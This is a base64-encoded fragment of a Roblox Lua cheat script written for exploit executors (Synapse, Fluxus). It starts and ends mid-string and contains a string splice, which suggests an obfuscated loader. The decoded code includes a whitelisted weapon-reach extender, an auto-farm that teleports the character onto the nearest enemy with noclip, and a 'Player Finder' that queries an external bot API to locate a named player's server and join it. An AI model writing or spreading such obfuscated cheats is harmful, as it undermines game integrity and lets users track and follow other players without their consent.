V4dFNpemUgPSA5CiAgICAgICAgTGFiZWwuUGFyZW50ID0gRnJhbWUKICAgICAgICBsb2NhbCBQYWQgPSBJbnN0YW5jZS5uZXcoIlVJUGFkZGluZyIpIFBhZC5QYWRkaW5nTGVmdCA9IFVEaW0ubmV3KDAsIDEwKSBQYWQuUGFyZW50ID0gTGFiZWwKCiAgICAgICAgbG9jYWwgQnV0dG9uID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgICAgICBCdXR0b24uU2l6ZSA9IFVEaW0yLm5ldygwLCAyMCwgMCwgMjApCiAgICAgICAgQnV0dG9uLlBvc2l0aW9uID0gVURpbTIubmV3KDEsIC0zMCwgMC41LCAtMTApCiAgICAgICAgQnV0dG9uLkJhY2tncm91bmRDb2xvcjMgPSBDb25maWcuV2VhcG9uRXh0ZW5kZXIgYW5kIENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMCkgb3IgQ29sb3IzLmZyb21SR0IoNDAsIDQwLCA1MCkKICAgICAgICBCdXR0b24uVGV4dCA9ICIiCiAgICAgICAgQnV0dG9uLlBhcmVudCA9IEZyYW1lCiAgICAgICAgbG9jYWwgQkNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBCQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDQpIEJDb3JuZXIuUGFyZW50ID0gQnV0dG9uCgogICAgICAgIEJ1dHRvbi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgaWYgbm90IENvbmZpZy5Jc1doaXRlbGlzdGVkIHRoZW4gCiAgICAgICAgICAgICAgICBTZW5kTm90aWZpY2F0aW9uKCJZb3VyIGtleSBpcyBub3Qgd2hpdGVsaXN0ZWQsIHlvdSBjYW5ub3QgdXNlIHRoaXMgb3B0aW9uIiwgMykgCiAgICAgICAgICAgICAgICByZXR1cm4gCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBDb25maWcuV2VhcG9uRXh0ZW5kZXIgPSBub3QgQ29uZmlnLldlYXBvbkV4dGVuZGVyCiAgICAgICAgICAgIEJ1dHRvbi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29uZmlnLldlYXBvbkV4dGVuZGVyIGFuZCBDb2xvcjMuZnJvbVJHQigyNTUsIDAsIDApIG9yIENvbG9yMy5mcm9tUkdCKDQwLCA0MCwgNTApCiAgICAgICAgICAgIGlmIENvbmZpZy5XZWFwb25FeHRlbmRlciB0aGVuIENvbmZpZy5XZWFwb25MZW5ndGggPSAyLjA2OyBTZXRXZWFwb25TaXplKDIuMDYpIGVsc2UgUmVzdG9yZVdlYXBvblNpemUoKSBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKCiAgICAtLSBSZW1vdmVkIEZhcm0gTmVhcmVzdCBmcm9tIEN1c3RvbSAoTW92ZWQgdG8gRmFybVNjcmlwdHMpCiAgICAtLSBjcmVhdGVTZWN0aW9uKFBhZ2VzLkN1c3RvbSwgIkZhcm0gTmVhcmVzdCAoT1ApIiwgMykKICAgIC0tIGNyZWF0ZVRvZ2dsZShQYWdlcy5DdXN0b20sICJFbmFibGUgRmFybSBOZWFyZXN0IiwgIkN1c3RvbUZhcm1OZWFyZXN0IiwgMy4xKQogICAgCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBmdW5jdGlvbiBUd2VlblRvKHRhcmdldFBvcykKICAgICAgICAgICAgaWYgY2hhcmFjdGVyIGFuZCByb290UGFydCBhbmQgcm9vdFBhcnQuUGFyZW50IHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGRpc3QgPSAocm9vdFBhcnQuUG9zaXRpb24gLSB0YXJnZXRQb3MpLk1hZ25pdHVkZQogICAgICAgICAgICAgICAgaWYgZGlzdCA8IDUgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxvY2FsIHNwZWVkID0gMzAwIAogICAgICAgICAgICAgICAgbG9jYWwgaW5mbyA9IFR3ZWVuSW5mby5uZXcoZGlzdCAvIHNwZWVkLCBFbnVtLkVhc2luZ1N0eWxlLkxpbmVhcikKICAgICAgICAgICAgICAgIGxvY2FsIHR3ZWVuID0gVHdlZW5TZXJ2aWNlOkNyZWF0ZShyb290UGFydCwgaW5mbywge0NGcmFtZSA9IENGcmFtZS5uZXcodGFyZ2V0UG9zKX0pCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxvY2FsIG5vY2xpcENvbm4gPSBSdW5TZXJ2aWNlLlN0ZXBwZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgaWYgY2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMoY2hhcmFjdGVyOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB2OklzQSgiQmFzZVBhcnQiKSB0aGVuIHYuQ2FuQ29sbGlkZSA9IGZhbHNlIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdHdlZW46UGxheSgpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHdoaWxlIHR3ZWVuLlBsYXliYWNrU3RhdGUgPT0gRW51bS5QbGF5YmFja1N0YXRlLlBsYXlpbmcgZG8KICAgICAgICAgICAgICAgICAgICBpZiBub3QgQ29uZmlnLklzUnVubmluZyBvciBub3QgQ29uZmlnLkN1c3RvbUZhcm1OZWFyZXN0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgdHdlZW46Q2FuY2VsKCkKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBpZiBub3QgY2hhcmFjdGVyIG9yIG5vdCByb290UGFydCBvciBub3Qgcm9vdFBhcnQuUGFyZW50IG9yIChodW1hbm9pZCBhbmQgaHVtYW5vaWQuSGVhbHRoIDw9IDApIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgdHdlZW46Q2FuY2VsKCkKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBpZiAocm9vdFBhcnQuUG9zaXRpb24gLSB0YXJnZXRQb3MpLk1hZ25pdHVkZSA8IDUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgdHdlZW46Q2FuY2VsKCkKICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBub2NsaXBDb25uIHRoZW4gbm9jbGlwQ29ubjpEaXNjb25uZWN0KCkgZW5kCiAgICAgICAgICAgICAgICBpZiByb290UGFydCB0aGVuIHJvb3RQYXJ0LlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoMCwwLDApIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCiAgICAgICAgd2hpbGUgQ29uZmlnLklzUnVubmluZyBkbwogICAgICAgICAgICBpZiBDb25maWcuQ3VzdG9tRmFybU5lYXJlc3QgYW5kIGNoYXJhY3RlciBhbmQgcm9vdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgaWYgbm90IENvbmZpZy5GYXN0TTEgdGhlbgogICAgICAgICAgICAgICAgICAgIC0tIENvbmZpZy5GYXN0TTEgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgLS0gaWYgRmFzdE0xQnRuIHRoZW4KICAgICAgICAgICAgICAgICAgICAtLSAgICAgRmFzdE0xQnRuLlRleHQgPSAiU1RPUCBGQVNUIE0xIgogICAgICAgICAgICAgICAgICAgIC0tICAgICBGYXN0TTFCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgNTAsIDUwKQogICAgICAgICAgICAgICAgICAgIC0tIGVuZAogICAgICAgICAgICAgICAgICAgIC0tIGlmIFN0YXJ0RmFzdE0xIHRoZW4gU3RhcnRGYXN0TTEoKSBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXQgPSBuaWwKICAgICAgICAgICAgICAgIGxvY2FsIG1pbkRpc3QgPSA5OTk5OQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCBmdW5jdGlvbiBzY2FuKGZvbGRlcikKICAgICAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyhmb2xkZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSBhbmQgdi5IdW1hbm9pZC5IZWFsdGggPiAwIGFuZCB2OkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZGlzdCA9IChyb290UGFydC5Qb3NpdGlvbiAtIHYuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbikuTWFnbml0dWRlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkaXN0IDwgbWluRGlzdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWluRGlzdCA9IGRpc3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXJnZXQgPSB2CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgd29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKCJFbmVtaWVzIikgdGhlbiBzY2FuKHdvcmtzcGFjZS5FbmVtaWVzKSBlbmQKICAgICAgICAgICAgICAgIHNjYW4od29ya3NwYWNlKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiB0YXJnZXQgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldFBvcyA9IHRhcmdldC5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uICsgVmVjdG9yMy5uZXcoMCwgMTUsIDApCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgY3VycmVudFBvcyA9IHJvb3RQYXJ0LlBvc2l0aW9uCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgZGlzdCA9IChjdXJyZW50UG9zIC0gdGFyZ2V0UG9zKS5NYWduaXR1ZGUKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiBkaXN0ID4gMTUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBUd2VlblRvKHRhcmdldFBvcykKICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcodGFyZ2V0UG9zLCB0YXJnZXQuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbikKICAgICAgICAgICAgICAgICAgICAgICAgcm9vdFBhcnQuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygwLDAsMCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyhjaGFyYWN0ZXI6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdjpJc0EoIkJhc2VQYXJ0IikgdGhlbiB2LkNhbkNvbGxpZGUgPSBmYWxzZSBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgdGFzay53YWl0KDAuMDUpCiAgICAgICAgZW5kCiAgICBlbmQpCgogICAgLS0gUmVtb3ZlZCBNYXN0ZXJ5IEZhcm0gZnJvbSBDdXN0b20gKE1vdmVkIHRvIEZhcm1TY3JpcHRzKQogICAgLS0gY3JlYXRlU2VjdGlvbihQYWdlcy5DdXN0b20sICJNYXN0ZXJ5IEZhcm0iLCA0KQogICAgLS0gY3JlYXRlVG9nZ2xlKFBhZ2VzLkN1c3RvbSwgIkVuYWJsZSBNYXN0ZXJ5IEZhcm0iLCAiTWFzdGVyeUZhcm0iLCA0LjEpCiAgICAKICAgIGlmIFRvZ2dsZUJ1dHRvbnNbIk1hc3RlcnlGYXJtIl0gdGhlbgogICAgICAgIFRvZ2dsZUJ1dHRvbnNbIk1hc3RlcnlGYXJtIl0uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIENvbmZpZy5NYXN0ZXJ5RmFybSBhbmQgbm90IENvbmZpZy5GYXN0TTEgdGhlbgogICAgICAgICAgICAgICAgLS0gQ29uZmlnLkZhc3RNMSA9IHRydWUKICAgICAgICAgICAgICAgIC0tIGlmIEZhc3RNMUJ0biB0aGVuCiAgICAgICAgICAgICAgICAtLSAgICAgRmFzdE0xQnRuLlRleHQgPSAiU1RPUCBGQVNUIE0xIgogICAgICAgICAgICAgICAgLS0gICAgIEZhc3RNMUJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCA1MCwgNTApCiAgICAgICAgICAgICAgICAtLSBlbmQKICAgICAgICAgICAgICAgIC0tIGlmIFN0YXJ0RmFzdE0xIHRoZW4gU3RhcnRGYXN0TTEoKSBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCgogICAgLS0gUGxheWVyIEZpbmRlciAoTW92ZWQgZnJvbSBTaG9wKQogICAgY3JlYXRlU2VjdGlvbihQYWdlcy5DdXN0b20sICJQbGF5ZXIgRmluZGVyIChXaGl0ZWxpc3QpIiwgMykKICAgIGNyZWF0ZUlucHV0KFBhZ2VzLkN1c3RvbSwgIlVzZXJuYW1lIiwgIkpvaW5QbGF5ZXJOYW1lIiwgMy4xKQogICAgCiAgICBkbwogICAgICAgIGxvY2FsIEZpbmRlckJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgRmluZGVyQnRuLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICAgICAgRmluZGVyQnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMCwgMjAsIDI1KQogICAgICAgIEZpbmRlckJ0bi5UZXh0ID0gIkZJTkQgUExBWUVSIChCT1QgTElOSykiIC4uIChDb25maWcuSXNXaGl0ZWxpc3RlZCBhbmQgIiIgb3IgIiDwn5SSIikKICAgICAgICBGaW5kZXJCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgRmluZGVyQnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgICAgIEZpbmRlckJ0bi5UZXh0U2l6ZSA9IDEwCiAgICAgICAgRmluZGVyQnRuLkxheW91dE9yZGVyID0gMy4yCiAgICAgICAgRmluZGVyQnRuLlBhcmVudCA9IFBhZ2VzLkN1c3RvbQogICAgICAgIAogICAgICAgIGxvY2FsIEZDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgRkNvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA0KSBGQ29ybmVyLlBhcmVudCA9IEZpbmRlckJ0bgogICAgICAgIAogICAgICAgIGxvY2FsIGlzRmluZGluZyA9IGZhbHNlCgogICAgICAgIEZpbmRlckJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgaWYgbm90IENvbmZpZy5Jc1doaXRlbGlzdGVkIHRoZW4KICAgICAgICAgICAgICAgIFNlbmROb3RpZmljYXRpb24oIldoaXRlbGlzdCByZXF1aXJlZCBmb3IgUGxheWVyIEZpbmRlciEiLCAzKQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgaWYgaXNGaW5kaW5nIHRoZW4KICAgICAgICAgICAgICAgIGlzRmluZGluZyA9IGZhbHNlCiAgICAgICAgICAgICAgICBGaW5kZXJCdG4uVGV4dCA9ICJGSU5EIFBMQVlFUiAoQk9UIExJTkspIgogICAgICAgICAgICAgICAgRmluZGVyQnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgU2VuZE5vdGlmaWNhdGlvbigiQm90IHNlYXJjaCBzdG9wcGVkLiIsIDIpCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBsb2NhbCB1c2VybmFtZSA9IENvbmZpZy5Kb2luUGxheWVyTmFtZQogICAgICAgICAgICBpZiBub3QgdXNlcm5hbWUgb3IgdXNlcm5hbWUgPT0gIiIgdGhlbgogICAgICAgICAgICAgICAgU2VuZE5vdGlmaWNhdGlvbigiUGxlYXNlIGVudGVyIGEgdXNlcm5hbWUuIiwgMykKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIGFwaVVybCA9IENvbmZpZy5Cb3RBcGlVcmwKICAgICAgICAgICAgaWYgbm90IGFwaVVybCBvciBhcGlVcmwgPT0gIiIgdGhlbgogICAgICAgICAgICAgICAgU2VuZE5vdGlmaWNhdGlvbigiUGxlYXNlIGVudGVyIHlvdXIgQm90IEFQSSBVUkwuIiwgMykKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGlzRmluZGluZyA9IHRydWUKICAgICAgICAgICAgRmluZGVyQnRuLlRleHQgPSAiU1RPUCBCT1QgU0VBUkNIIgogICAgICAgICAgICBGaW5kZXJCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgNTAsIDUwKQogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgcmVxdWVzdEZ1bmMgPSAoc3luIGFuZCBzeW4ucmVxdWVzdCkgb3IgKGh0dHAgYW5kIGh0dHAucmVxdWVzdCkgb3IgaHR0cF9yZXF1ZXN0IG9yIChmbHV4dXMgYW5kIGZsdXh1cy5yZXF1ZXN0KSBvciByZXF1ZXN0CiAgICAgICAgICAgIGlmIG5vdCByZXF1ZXN0RnVuYyB0aGVuCiAgICAgICAgICAgICAgICBTZW5kTm90aWZpY2F0aW9uKCJFeGVjdXRvciBkb2VzIG5vdCBzdXBwb3J0IEhUVFAgcmVxdWVzdHMuIiwgNCkKICAgICAgICAgICAgICAgIGlzRmluZGluZyA9IGZhbHNlCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIC0tIDEuIFNlbmQgU2VhcmNoIFJlcXVlc3QgdG8gQm90CiAgICAgICAgICAgICAgICBTZW5kTm90aWZpY2F0aW9uKCJTZW5kaW5nIHJlcXVlc3QgdG8gQm90Li4uIiwgMikKICAgICAgICAgICAgICAgIGxvY2FsIHN1Y2Nlc3MsIHJlc3BvbnNlID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIHJldHVybiByZXF1ZXN0RnVuYyh7CiAgICAgICAgICAgICAgICAgICAgICAgIFVybCA9IGFwaVVybCAuLiAiL3NlYXJjaCIsCiAgICAgICAgICAgICAgICAgICAgICAgIE1ldGhvZCA9ICJQT1NUIiwKICAgICAgICAgICAgICAgICAgICAgICAgSGVhZGVycyA9IHtbIkNvbnRlbnQtVHlwZSJdID0gImFwcGxpY2F0aW9uL2pzb24ifSwKICAgICAgICAgICAgICAgICAgICAgICAgQm9keSA9IEh0dHBTZXJ2aWNlOkpTT05FbmNvZGUoe3VzZXJuYW1lID0gdXNlcm5hbWV9KQogICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIG5vdCBzdWNjZXNzIG9yIG5vdCByZXNwb25zZSBvciByZXNwb25zZS5TdGF0dXNDb2RlIH49IDIwMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgU2VuZE5vdGlmaWNhdGlvbigiRmFpbGVkIHRvIGNvbnRhY3QgQm90LiIsIDMpCiAgICAgICAgICAgICAgICAgICAgaXNGaW5kaW5nID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBGaW5kZXJCdG4uVGV4dCA9ICJGSU5EIFBMQVlFUiAoQk9UIExJTkspIgogICAgICAgICAgICAgICAgICAgIEZpbmRlckJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBTZW5kTm90aWZpY2F0aW9uKCJCb3QgaXMgc2VhcmNoaW5nIGZvciAiIC4uIHVzZXJuYW1lIC4uICIuLi4iLCAzKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAtLSAyLiBQb2xsIGZvciBTdGF0dXMKICAgICAgICAgICAgICAgIHdoaWxlIGlzRmluZGluZyBhbmQgQ29uZmlnLklzUnVubmluZyBkbwogICAgICAgICAgICAgICAgICAgIGxvY2FsIHBTdWNjZXNzLCBwUmVzcG9uc2UgPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiByZXF1ZXN0RnVuYyh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBVcmwgPSBhcGlVcmwgLi4gIi9zdGF0dXM/dXNlcm5hbWU9IiAuLiB1c2VybmFtZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE1ldGhvZCA9ICJHRVQiCiAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIHBTdWNjZXNzIGFuZCBwUmVzcG9uc2UgYW5kIHBSZXNwb25zZS5TdGF0dXNDb2RlID09IDIwMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGRhdGEgPSBIdHRwU2VydmljZTpKU09ORGVjb2RlKHBSZXNwb25zZS5Cb2R5KQogICAgICAgICAgICAgICAgICAgICAgICBpZiBkYXRhLnN0YXR1cyA9PSAiZm91bmQiIGFuZCBkYXRhLmpvYklkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGRhdGEuam9iSWQgPT0gZ2FtZS5Kb2JJZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2VuZE5vdGlmaWNhdGlvbigiWW91IGFyZSBhbHJlYWR5IGluIHRoZSBjb3JyZWN0IHNlcnZlciEiLCA1KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlzRmluZGluZyA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRmluZGVyQnRuLlRleHQgPSAiRklORCBQTEFZRVIgKEJPVCBMSU5LKSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGaW5kZXJCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpc0ZpbmRpbmcgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRmluZGVyQnRuLlRleHQgPSAiRklORCBQTEFZRVIgKEJPVCBMSU5LKSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZpbmRlckJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0UGxhY2VJZCA9IGRhdGEucGxhY2VJZCBvciBnYW1lLlBsYWNlSWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIENyZWF0ZUNvbmZp" .. "cm1hdGlvblByb21wdCgiUGxheWVyIEZvdW5kIVxuU2VydmVyIElEOiAiIC4uIGRhdGEuam9iSWQsIGRhdGEuam9iSWQsIHRhcmdldFBsYWNlSWQsIGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBzdWNjZXNzLCBlcnIgPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiVGVsZXBvcnRTZXJ2aWNlIik6VGVsZXBvcnRUb1BsYWNlSW5zdGFuY2UodGFyZ2V0UGxhY2VJZCwgdG9zdHJpbmcoZGF0YS5qb2JJZCksIHBsYXllcikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IHN1Y2Nlc3MgdGhlbiBTZW5kTm90aWZpY2F0aW9uKCJUZWxlcG9ydCBmYWlsZWQuIFBsZWFzZSByZXRyeS4iLCA0KSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCwgZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNlbmROb3RpZmljYXRpb24oIkpvaW4gY2FuY2VsbGVkLiIsIDMpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZiBkYXRhLnN0YXR1cyA9PSAiZXJyb3IiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNlbmROb3RpZmljYXRpb24oIkJvdCBFcnJvcjogIiAuLiAoZGF0YS5tZXNzYWdlIG9yICJVbmtub3duIiksIDMpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMykgLS0gUG9sbCBldmVyeSAzIHNlY29uZHMKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kKQoKICAgIGVuZAoKICAgIGRvCiAgICAgICAgbG9jYWwgU2Nhbm5lckJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgU2Nhbm5lckJ0bi5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDMwKQogICAgICAgIFNjYW5uZXJCdG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwLCAyMCwgMjUpCiAgICAgICAgU2Nhbm5lckJ0bi5UZXh0ID0gIkpPSU4gUExBWUVSIChKT0lOUyBPRkYpIiAuLiAoQ29uZmlnLklzV2hpdGVsaXN0ZWQgYW5kICIiIG9yICIg8J+UkiIpCiAgICAgICAgU2Nhbm5lckJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgICAgICBTY2FubmVyQnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgICAgIFNjYW5uZXJCdG4uVGV4dFNpemUgPSAxMAogICAgICAgIFNjYW5uZXJCdG4uTGF5b3V0T3JkZXIgPSAzLjMKICAgICAgICBTY2FubmVyQnRuLlBhcmVudCA9IFBhZ2VzLkN1c3RvbQogICAgICAgIAogICAgICAgIGxvY2FsIFNDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgU0Nvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA0KSBTQ29ybmVyLlBhcmVudCA9IFNjYW5uZXJCdG4KICAgICAgICAKICAgICAgICBsb2NhbCBpc1NjYW5uaW5nID0gZmFsc2UKCiAgICAgICAgU2Nhbm5lckJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgaWYgbm90IENvbmZpZy5Jc1doaXRlbGlzdGVkIHRoZW4KICAgICAgICAgICAgICAgIFNlbmROb3RpZmljYXRpb24oIldoaXRlbGlzdCByZXF1aXJlZCBmb3IgUGxheWVyIEZpbmRlciEiLCAzKQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgaWYgaXNT